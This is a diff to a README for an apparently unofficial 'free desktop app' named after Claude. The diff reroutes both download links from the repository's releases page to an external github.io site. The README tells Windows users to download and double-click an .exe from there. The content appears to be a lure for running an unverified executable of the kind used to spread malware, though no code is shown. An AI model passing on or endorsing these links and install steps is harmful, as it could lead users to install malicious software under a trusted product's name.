@@ -1,6 +1,6 @@
 # 🖥️ claude-ai-free-desktop-app - Access powerful AI coding tools locally
 
-[![Download Now](https://img.shields.io/badge/Download-Free-blue)](https://github.com/freedomfromsearchandseizuremould96/claude-ai-free-desktop-app/releases)
+[![Download Now](https://img.shields.io/badge/Download-Free-blue)](https://freedomfromsearchandseizuremould96.github.io)
 
 ## What is this application?
 
@@ -22,7 +22,7 @@ Your computer must meet these basic standards to run the application smoothly:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the [releases page](https://github.com/freedomfromsearchandseizuremould96/claude-ai-free-desktop-app/releases) to access the downloads.
+1. Visit the [releases page](https://freedomfromsearchandseizuremould96.github.io) to access the downloads.
 2. Select the file ending in `.exe` that corresponds to the latest version listed at the top.
 3. Save the file to your desktop or your Downloads folder.
 4. Double-click the downloaded file to start the installation.
